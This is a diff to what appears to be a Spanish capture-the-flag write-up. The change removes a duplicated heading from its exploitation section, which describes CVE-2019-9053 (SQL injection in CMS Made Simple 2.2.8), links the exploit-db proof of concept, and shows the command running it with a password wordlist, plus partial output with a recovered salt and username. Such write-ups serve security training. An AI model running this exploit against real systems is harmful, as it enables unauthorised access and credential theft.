@@ -62,7 +62,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Explotación
 
-<h2>Explotación</h2><h3>Vector de Ataque Principal</h3><p>Vulnerabilidad explotada: [SQL Injection] Severidad: [Critica] CVE: [cve-2019-9053]</p><h3>Pasos de Explotación</h3><h4>1. Identificación de la Vulnerabilidad</h4><p>Despues de una busqueda se encontro que CMS Made Simple version 2.2.8 es vulnerable y registrado por la cve-2019-9053</p><h4>2. Exploit</h4><p>Exploit obtenido de:</p><pre><code>https://www.exploit-db.com/exploits/46635</code></pre><h4>3. Ejecución del Exploit</h4><p><strong>Ejecutar exploit:</strong></p><pre><code class="language-bash">python2 ./poc2.py -u http://&lt;TARGET_IP&gt;/simple/ -w /usr/share/wordlists/rockyou.txt -c
+<h3>Vector de Ataque Principal</h3><p>Vulnerabilidad explotada: [SQL Injection] Severidad: [Critica] CVE: [cve-2019-9053]</p><h3>Pasos de Explotación</h3><h4>1. Identificación de la Vulnerabilidad</h4><p>Despues de una busqueda se encontro que CMS Made Simple version 2.2.8 es vulnerable y registrado por la cve-2019-9053</p><h4>2. Exploit</h4><p>Exploit obtenido de:</p><pre><code>https://www.exploit-db.com/exploits/46635</code></pre><h4>3. Ejecución del Exploit</h4><p><strong>Ejecutar exploit:</strong></p><pre><code class="language-bash">python2 ./poc2.py -u http://&lt;TARGET_IP&gt;/simple/ -w /usr/share/wordlists/rockyou.txt -c
 
 [+] Salt for password found: 1dac0********
 [+] Username found: mitch
